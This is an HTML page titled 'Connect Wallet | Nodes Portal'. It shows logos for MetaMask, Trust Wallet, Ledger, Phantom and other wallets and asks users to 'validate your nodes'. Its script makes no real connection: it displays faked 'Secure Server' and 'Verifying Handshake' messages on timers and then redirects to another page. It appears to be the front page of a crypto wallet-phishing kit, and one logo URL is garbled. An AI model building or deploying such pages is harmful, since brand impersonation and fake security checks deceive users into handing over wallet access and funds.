<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect Wallet | Nodes Portal</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background-color: #0d1117;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
        }
        .container { width: 100%; max-width: 440px; padding: 20px; }
        .card {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 24px;
            padding: 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
        }
        .header { text-align: center; margin-bottom: 30px; }
        .header h2 { font-size: 24px; margin-bottom: 8px; }
        .header p { color: #8b949e; font-size: 14px; }

        .wallet-list {
            display: flex; flex-direction: column; gap: 12px;
            max-height: 450px; overflow-y: auto; padding-right: 8px;
        }
        /* Custom Scrollbar */
        .wallet-list::-webkit-scrollbar { width: 4px; }
        .wallet-list::-webkit-scrollbar-thumb { background: #30363d; border-radius: 10px; }

        .wallet-item {
            display: flex; align-items: center; justify-content: space-between;
            background: #21262d; border: 1px solid #30363d;
            padding: 14px 20px; border-radius: 16px;
            cursor: pointer; transition: 0.2s ease;
        }
        .wallet-item:hover {
            background: #2d333b; border-color: #58a6ff;
            transform: translateY(-1px);
        }
        .wallet-name { font-size: 17px; font-weight: 600; }
        .wallet-icon { width: 34px; height: 34px; object-fit: contain; }

        .overlay {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85); z-index: 100;
            justify-content: center; align-items: center; flex-direction: column;
        }
        .spinner {
            width: 50px; height: 50px; border: 5px solid #30363d;
            border-top: 5px solid #58a6ff; border-radius: 50%;
            animation: spin 1s linear infinite; margin-bottom: 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div id="loadingOverlay" class="overlay">
    <div class="spinner"></div>
    <p id="statusText">Connecting to Secure Server...</p>
</div>

<div class="container">
    <div class="card">
        <div class="header">
            <h2>Connect Wallet</h2>
            <p>Select your wallet to validate your nodes</p>
        </div>

        <div class="wallet-list">
            <div class="wallet-item" onclick="startConnect('MetaMask')">
                <span class="wallet-name">MetaMask</span>
                <img src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/Logomark/Metamask-衝刺-Logo.png" class="wallet-icon">
            </div>

            <div class="wallet-item" onclick="startConnect('Trust Wallet')">
                <span class="wallet-name">Trust Wallet</span>
                <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.png" class="wallet-icon">
            </div>

            <div class="wallet-item" onclick="startConnect('Coinbase Wallet')">
                <span class="wallet-name">Coinbase Wallet</span>
                <img src="https://avatars.githubusercontent.com/u/18060234?s=200&v=4" class="wallet-icon">
            </div>

            <div class="wallet-item" onclick="startConnect('WalletConnect')">
                <span class="wallet-name">WalletConnect</span>
                <img src="https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Logo/Blue%20(Default)/Logo.png" class="wallet-icon">
            </div>

            <div class="wallet-item" onclick="startConnect('Ledger')">
                <span class="wallet-name">Ledger</span>
                <img src="https://www.ledger.com/wp-content/uploads/2021/11/Ledger_favicon.png" class="wallet-icon">
            </div>

            <div class="wallet-item" onclick="startConnect('Phantom')">
                <span class="wallet-name">Phantom</span>
                <img src="https://phantom.app/favicon.ico" class="wallet-icon">
            </div>

            <div class="wallet-item" onclick="startConnect('Exodus')">
                <span class="wallet-name">Exodus</span>
                <img src="https://www.exodus.com/apple-touch-icon.png" class="wallet-icon">
            </div>

            <div class="wallet-item" onclick="startConnect('SafePal')">
                <span class="wallet-name">SafePal</span>
                <img src="https://safepal.com/favicon.ico" class="wallet-icon">
            </div>
            
            <div class="wallet-item" onclick="startConnect('Argent')">
                <span class="wallet-name">Argent</span>
                <img src="https://www.argent.xyz/favicon.ico" class="wallet-icon">
            </div>
        </div>
    </div>
</div>

<script>
    function startConnect(name) {
        const overlay = document.getElementById('loadingOverlay');
        const status = document.getElementById('statusText');
        overlay.style.display = 'flex';
        
        status.innerText = "Starting connection to " + name + "...";
        
        setTimeout(() => {
            status.innerText = "Verifying Handshake...";
        }, 1500);

        setTimeout(() => {
            // Redirect to your next page (e.g., node validation page)
            window.location.href = "index.html"; 
        }, 3500);
    }
</script>

</body>
</html>
